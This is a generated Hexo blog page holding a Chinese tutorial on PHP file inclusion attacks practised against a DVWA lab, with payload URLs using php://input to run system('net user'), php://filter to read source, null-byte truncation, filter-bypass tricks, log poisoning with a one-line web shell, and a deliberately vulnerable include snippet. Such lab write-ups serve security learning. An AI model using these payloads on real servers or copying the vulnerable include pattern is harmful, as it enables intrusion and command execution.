@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="future.zhangyan">
+
+
+
+    <meta name="description" content="未来可期">
+
+
+
+<title>文件包含 | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+	<!--动态线条背景-->
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+<body>
+    <div class="wrapper">
+        <header>
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet">
+	  <script type="text/javascript" src="C:/Users/zhangyan/Desktop/blog/themes/next/source/js"></script>
+
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">张艳&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+				<label for="switch_default" class="toggleBtn"></label>
+         
+				<div class="search bar7">
+					<form id="search-form"> <!-- 搜索框相关 -->
+						<input type="text" id="local-search-input" name="q" results="0" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off"/>
+						<button type="submit" class="search-form-submit"></button>
+						<i class="fa fa-times" onclick="resetSearch()"></i> <!-- 清空/重置搜索框 -->
+					</form>
+					<div class="ins-section-wrapper">
+						<div class="ins-section-container"></div>
+					</div>
+					<div id="local-search-result"></div> <!-- 搜索结果区 -->
+						<p class='no-result'>No results found </p> <!-- 无匹配时显示，注意请在 CSS 中设置默认隐藏 -->
+					</div>
+
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">张艳&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                    <a class="menu-item" href="/book">Book</a>
+                
+                    <a class="menu-item" href="/bangumis">Bangumis</a>
+                
+            </div>
+
+
+        </div>
+    </nav>
+
+</header>
+<style type="text/css">
+	* {
+		box-sizing:border-box;
+	}
+	body {
+		margin:0;
+		padding:0;
+		background-image:url(ydrzimages/p3.jpg);
+		font-weight:500;
+		font-family:"Microsoft YaHei","宋体","Segoe UI","Lucida Grande",Helvetica,Arial,sans-serif,FreeSans,Arimo;
+	}
+	#container {
+		width:500px;
+		height:820px;
+		margin:0 auto;
+	}
+	div.search {
+		padding:10px 0;
+		margin-left:200px
+	}
+	form {
+		position:relative;
+		width:300px;
+		margin:0 auto;
+	}
+	input,button {
+		border:none;
+		outline:none;
+	}
+	input {
+		width:100%;
+		height:42px;
+		padding-left:13px;
+	}
+	button {
+		height:42px;
+		width:42px;
+		cursor:pointer;
+		position:absolute;
+	}
+	/*搜索框7*/
+		  
+	.bar7 form {
+		height:42px;
+	}
+	.bar7 input {
+		width:200px;
+		border-radius:42px;
+		border:2px solid #324B4E;
+		transition:.3s linear;
+		float:right;
+	}
+	.bar7 input:focus {
+		width:300px;
+	}
+	.bar7 button {
+		background:none;
+		top:-2px;
+		right:20px;
+	}
+	.bar7 button:before {
+		content:"点..";
+		font-family:FontAwesome;
+		color:#324b4e;
+	}
+	.no-result{
+		display:none
+	}
+</style>
+
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">文件包含</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">future.zhangyan</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 12, 2020&nbsp;&nbsp;22:30:50</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                            
+                        </span>
+						<span id="/2020/04/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="leancloud-visitors view" data-flag-title="文件包含">
+						  <em class="post-meta-item-text">Pageviews:</em>
+						  <i class="leancloud-visitors-count"></i>
+						</span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.png"></p>
+<h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>使用include文件</p>
+<p>代码表示上传的文件都以php执行</p>
+<p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.jpg" alt="img"></p>
+<p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.jpg" alt="img"></p>
+<h2 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h2><p>需要把allow_url_include=on，magic_quotes_gpc=off</p>
+<h2 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h2><p>      当某个PHP文件存在本地包含漏洞，而却无法上传正常文件，这就意味这有包含漏洞却不能拿来利用，这时攻击者就有可能会利用apache日志文件来入侵。            Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中</p>
+<p>开启apache日志方法打开配置文件-httpd-conf，打开httpd.conf配置文件，</p>
+<p>第299行：</p>
+<p>\1.    ##CustomLog “logs/access.log” common</p>
+<p>去掉前边的 # ，并<strong>重启apache</strong>。</p>
+<p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.PNG" alt="img"></p>
+<p>写入一句话木马</p>
+<h1 id="PHP包含写文件"><a href="#PHP包含写文件" class="headerlink" title="PHP包含写文件"></a>PHP包含写文件</h1><p>构造URL:</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://input">http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://input</a>,</p>
+<p>并且提交post数据为:</p>
+<?php system('net user');?>
+
+<p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/4.jpg" alt="img"></p>
+<p>​     注意:只有在allow _url_include为on的时候才可以使用,如果想查看回显结果那必须在C:\php\php-5.2.14-Win32下找到php-apache2handler.ini打开，查找display_funtions=proc-open,oppen,exec,system…….删掉system重启apache。</p>
+<h1 id="PHP包含读文件"><a href="#PHP包含读文件" class="headerlink" title="PHP包含读文件"></a>PHP包含读文件</h1><p><a target="_blank" rel="noopener" href="http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php">http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php</a></p>
+<p>访问URL,得到经过base64加密后的字符串:</p>
+<p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/5.jpg"></p>
+<p><img src="/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/7.jpg"></p>
+<h1 id="包含截断绕过"><a href="#包含截断绕过" class="headerlink" title="包含截断绕过"></a>包含截断绕过</h1><?php
+
+​         if(isset($_GET['page'])){
+
+​                  include$_GET['page'] .".php" ;
+
+​         }else{
+
+​                  include'home.php';
+
+​         }
+
+?>
+
+<p>   这种方法只适合于magic_quotes_gpc=off的时候， php版本小于5.3.4，可通过%00截断绕过，不过现在已经很难见到了，比如：index.php?file=info.txt//////////////…………超过一定数据的/。</p>
+<h1 id="str-replace、fnmatch涵数绕过"><a href="#str-replace、fnmatch涵数绕过" class="headerlink" title="str_replace、fnmatch涵数绕过"></a>str_replace、fnmatch涵数绕过</h1><h3 id="str-replace函数绕过"><a href="#str-replace函数绕过" class="headerlink" title="str_replace函数绕过:"></a>str_replace函数绕过:</h3><p>使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。</p>
+<p>例如page=ht<a target="_blank" rel="noopener" href="http://tp//192.168.0.103/phpinfo.txt%E6%97%B6%EF%BC%8Cstr_replace%E5%87%BD%E6%95%B0%E4%BC%9A%E5%B0%86http://%E5%88%A0%E9%99%A4%EF%BC%8C%E4%BA%8E%E6%98%AFpage=http://192.168.0.103/phpinfo.txt%EF%BC%8C%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E3%80%82">http://tp://192.168.0.103/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.0.103/phpinfo.txt，成功执行远程命令。</a></p>
+<p>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p>
+<p>1、本地文件包含</p>
+<p> <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=..././777.jpg">http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=…/./777.jpg</a></p>
+<p>2、绝对路径不受任何影响<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=c:/2.txt">http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=c:/2.txt</a></p>
+<p>3、远程文件包含:<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=htthttp://p://192.168.0.106:8080/index.php">http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=htthttp://p://192.168.0.106:8080/index.php</a></p>
+<h3 id="fnmatch函数绕过"><a href="#fnmatch函数绕过" class="headerlink" title="fnmatch函数绕过"></a>fnmatch函数绕过</h3><p>if(!fnmatch(“file*”,$file)&amp;&amp;$file!=”include.php”),当文件既不是”include.php”也不是”file*”（文件名file开头）时才抛出错误，反之意思，如果文件名符合其中一个条件既可以。page=file:///C:/xampp/htdocs/dvwa/php.ini 刚好满足”file*”（文件名file开头）。</p>
+<p> <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=file:///C:/2.txt">http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=file:///C:/2.txt</a></p>
+<h2 id="php内置协议"><a href="#php内置协议" class="headerlink" title="php内置协议"></a>php内置协议</h2><table>
+<thead>
+<tr>
+<th>File://</th>
+<th>访问本地文件系统</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>htt[p://</td>
+<td>访问HTTP(s)网址</td>
+</tr>
+<tr>
+<td>ftp://</td>
+<td>访问FTP(s)URLS</td>
+</tr>
+<tr>
+<td>php://</td>
+<td>访问各个输入/输出流(I/o streams)</td>
+</tr>
+<tr>
+<td>zlib://</td>
+<td>压缩流</td>
+</tr>
+<tr>
+<td>data://</td>
+<td>数据(RFC2397)</td>
+</tr>
+<tr>
+<td>ssh2://</td>
+<td>Secure Shell 2</td>
+</tr>
+<tr>
+<td>expect://</td>
+<td>处理交互式的流</td>
+</tr>
+<tr>
+<td>glob://</td>
+<td>查找匹配的文件路径模式</td>
+</tr>
+</tbody></table>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>future.zhangyan</span>
+                    </p>
+                
+				
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://zhangyanlady.github.io/2020/04/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">https://zhangyanlady.github.io/2020/04/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>The future can be expected, the world is worth it.</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"># 网络安全</a>
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/05/09/waf%E7%BB%95%E8%BF%87/">waf绕过</a>
+            
+            
+            <a class="next" rel="next" href="/2020/03/19/DDOS%E6%94%BB%E5%87%BB/">DDOS攻击</a>
+            
+        </section>
+			</br>
+			
+
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© future.zhangyan | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+	<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+    </div>
+
+
+	
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
